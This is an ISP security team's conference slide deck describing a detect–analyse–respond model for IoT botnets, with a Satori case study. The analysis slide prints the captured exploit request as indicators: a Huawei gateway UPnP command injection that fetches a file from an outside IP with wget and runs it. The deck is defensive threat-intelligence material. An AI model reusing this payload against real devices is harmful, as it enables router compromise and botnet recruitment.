Detect & Respond to IoT Botnets AS AN ISP
Christoph Giese
Telekom Security; Cyber DefenSe Center

Management Summary
· Mirai hit us hard; IoT Botnets are on the rise and rapidly evolving · We developed a three-stage model to handle this threat and proved it´s value
on a real-world example · Work in progress; continuously improvement needed
2

History / Threat description The evolution of IoT botnets

IOT botnets on the rise

Mirai Surface
2016

DDoS against OVH/Krebs Volume > 1Tbps

8 billion IoT devices*
2017

IoT Reaper

Mirai source code released (Multiple clusters rising)

Compromise attempt on DTAG CPEs

DTAG attacker arrested

Satori

JenX offers 200 FBI took over 500k

Gbit/s DDoS for Botnet. Destructive

$20

MW

2018

2019/2020

65k routers acting as (APT) proxy
exploiting UPNP

You are here, having fun looking forward

20 billion IoT devices*

[USENIX]; *[Gartner]

4

IOT botnets Rapidly evolving

Mirai v1
1) Tries 64 user/password combinations on random IPs on port 23
2) Pre-Defined DDoS modules

2 years

3) Waiting for an IP to kill
First Worm  Modern malware 30y In IoT  2 years

VPNFilter
[APNIC] Graphic by [Talos]
5

Our three level approach Applying security best-practices on a new threat

We developed a three-stage model for handle Iot Botnets as ISP

DETECT

ANALYZE

RESPOND

Blackhole Monitoring

Sandboxing / Reversing Payload

Monitor / Block IoCs on network borders

Honeypot Monitoring
Customer Premises Equipment (CPE)
Monitoring

Anomaly Detection (Alarming)

Tracking activities (DNS, pDNS, Peakflow)

Processes & Sharing

Correlation to seen attacks

Rollout of mitigations to CPE
Report affected IPs to customers

Inspired by the good old OODA loop (Thanks for breaking my browser with your 200+ slide deck @FrodeHommedal) 7

Heavily increased detection capabilities

Blackhole Monitoring  Monitor unused IP address ranges  Fastest alerting capabilities  Set of anomaly detections (Std. Deviations/Single SYN/...)
Honeypot Monitoring  Worldwide honeypot network  In-depth view about attacker behavior (shell history;
dropped files/samples) CPE Monitoring  Availability (e.g. registration rates vs baseline)
Detect & Respond to IoT Botnets as an ISP

D

A

R

[Detect]

Independent sensors for best coverage; Centralized monitoring for correlations

Christoph Giese; Telekom Security

8

Analyze phase to enrich information for response

Sandboxing/Reversing  Analyze honeypot payload to identify IoCs
Tracking Activities  pDNS: First seen in Germany? (All customers DNS)  pDNS: FastFlux? Multiple domains?  Important  Peakflow: Increasing activity from customer routers?
Correlation to seen attacks  MISP correlations using tons of public/private feeds  CTI analysts classification to seen attacks (under
construction)

D

A

R

[Analyze]

Invest in the best sources Understand the threat
Enrich information to respond

Detect & Respond to IoT Botnets as an ISP

Christoph Giese; Telekom Security

9

AS an ISP we established multiple response capabilities

Protection at network borders  Filtering on TCP/IP layer  Sinkhole C2 domains (roadmap; german law)
Rollout of mitigations to the CPE  With suppliers  If applicable and necessary
Report affected IPs to customers  Inform infected customers via postal letter  ISP exchange via centralized MISP for fully-automated
information exchange (under construction)
Detect & Respond to IoT Botnets as an ISP

D

A

R

[Respond]

Apply mitigations to protect our customers

Christoph Giese; Telekom Security

10

Real-world examples Applying our model on the satori case

The blackhole sensor detected huge spike

Blackhole Sensor

D

A

R

[Detect]

Tolerance threshold exceeded in standard deviation 2017-12-05 03:02 (UTC)
Detect & Respond to IoT Botnets as an ISP

Alarming in SoC: We have a large traffic spike on port 37215 TCP

Christoph Giese; Telekom Security

12

Analyze Spike
Traffic Analysis · >75k unique source IP addresses · Devices are routers from North-Africa / South-America
(Tunisia/Egypt) · No IP addresses from our network
 No 3rd level escalation over night required
IoCs IP TTL < 64 TCP Window Size: 5600 - 5808 Packet length=74 Bytes

Find starting point for investigation

D

A

R

[Analyze]

Are we affected? SPEED! Determined escalation level
13

Sandboxing and reversing revealed IoCs Enrich detected
anomaly with IoCs

Sandboxing/Reversing 1. Find payload in the honeypot network 2. Analyze payload using reverse engineering 3. Share information to track malware
IoCs: POST /ctrlt/DeviceUpgrade_1 HTTP/1.1 Host: 80.158.17.35:37215
Authorization: Digest username="dslfconfig", realm="HuaweiHomeGateway"

D

A

R

[Analyze]

<NewStatusURL>$(/bin/busybox wget -g 95.211.123.69 -l /tmp/.f -r /b; sh /tmp/.f)</NewStatusURL>
<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>

Understood vulnerability Collected additional IoCs

14

Respond based on impact
Protection on network borders  Continuous monitoring of IoCs started  24/7 team briefed
Rollout of mitigations to the endpoint  CPE department confirmed: Vulnerable SW not in use  Vulnerable webserver not in use in home automation devices
Report affected IPs to customers  Internal: Not needed; External: Roadmap

D

A

R

[Respond]

Apply mitigations to protect customers
15

Summary & Outlook

DETECT

ANALYZE

RESPOND

Blackhole Monitoring

Sandboxing / Reversing Payload

Monitor / Block IoCs on network borders

Honeypot Monitoring
Customer Premises Equipment (CPE)
Monitoring

Anomaly Detection (Alarming)

Tracking activities (DNS, pDNS, Peakflow)

Processes & Sharing

Correlation to seen attacks

Rollout of mitigations to CPE
Report affected IPs to owners

16

Thanks! Questions?
Christoph Giese <cert@telekom.de>
t-systems Cyber DefenSe Center

DISCussion
- How do you handle news on vulnerabilities in IoT devices as a [manufactor, customer, ISP]? - Are you [as a CERT/CDC/SoC] interested in malicious source IP addresses from infected devices? - How should we as a security community be prepared for more and more complex IoT botnets?
18

Sources
[Antonakakis2017] https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-antonakakis.pdf [APNIC] https://blog.apnic.net/2017/03/21/questions-answered-mirai-botnet/ [Cloudflare] https://blog.cloudflare.com/inside-mirai-the-infamous-iot-botnet-a-retrospective-analysis/ [Gartner] https://www.gartner.com/newsroom/id/3598917 https://www.bleepingcomputer.com/news/security/over-65-000-home-routers-are-proxying-bad-traffic-for-botnets-apts/ [Talos] https://blog.talosintelligence.com/2018/05/VPNFilter.html [Wired] https://www.wired.com/story/upnp-router-game-console-vulnerabilities-exploited/

Detect & Respond to IoT Botnets as an ISP

Christoph Giese; Telekom Security

19

Backup

Who WE ARE
Goal: Protect company and their customers

Cyber Defense Center & CERT
· Design/Build rules for the detection mechanisms in 24/7 SoC
-----------· Incident Coordination · Information sharing

SoC/s
· Monitoring/Feedback · 24/7 Alarming
Cyber Threat Intel
· Research · MW Analysis

Sensor Experts
· Continuous Improvement of capabilities

FRAUD

Abuse

[...]

· Inform customers / track

status

21

Who AM I

Cyber Defense Center & CERT
· Design/Build rules for the detection mechanisms in 24/7 SoC
-----------· Incident Coordination · Information sharing

Christoph Giese

Work / Studies

· Automotive · CDC/CERT

(Software Engineer; 2y) (Forensics/ 3rd level SoC / Tech CTI / SW Dev / Sec Platform; 3.5y)

· Msc Digital Forensics (Topic: IoC vetting; on-the-job)

· Open Source supporter / Music / Sports / Discussions

22

Threat Description
Attackers view
Advantages of IoT devices
+ 24/7 online + (Mostly) unmonitored + Poorly secured + Increasing market + Increasing computing power + Max distributed

Category
Consumer
Business: CrossIndustry
Business: VerticalSpecific
Grand Total

2017 5,244.3 1,501.0

2018 2020 7,036.3 12,863.0 2,132.6 4,381.4

1,635.4 2,027.7 3,171.0

8,380.6 11,196.6 20,415.4
[Gartner]

Detect & Respond to IoT Botnets as an ISP

Christoph Giese; Telekom Security

23

Rapid evolution of IOT botnets

Mirai v1

1

Rep: Trivial 64 default user-pwcombinations

Detect: Trivial Noisy & Low Tech

Mirai Copy Cats 2
Rep: Easy Code leak paved the way to new variants
Detect: Easy Still Noisy, but multiple clusters*

IoT Reaper

3

Rep: Advanced Flexible LUA engine

Detect: Advanced Code updates on-thefly  Rep technique not discloses assigned botnet on its own

JenX

4

Rep: Advanced Not relying on infected device

Detect: Challenge Size not easy countable

Rep=Replication * [antonakakis2017]
24

Our Model for handling Iot Botnets as ISP

Tracking Activities  pDNS: (First) seen in Germany?
 2017-12-05  pDNS: FastFlux? Multiple domains?  Important
 Simple IP communication
 Peakflow: Increasing activity from customer routers?  No anomalies
Correlation to seen attacks  MISP correlations using tons of public/private feeds
 First information incoming

D

A

R

[Analyze]

· CTI-Analysts classification to seen attacks
· Based on Mirai source code

Extended timeline information Investigated additional communication channels
25

IntelMQ ­ Message Bus System

Collector

Parser

Expert

Output

Collector

Parser

Expert

Expert

Output

Expert

Output

26

Vetting of Indicators - 1
27

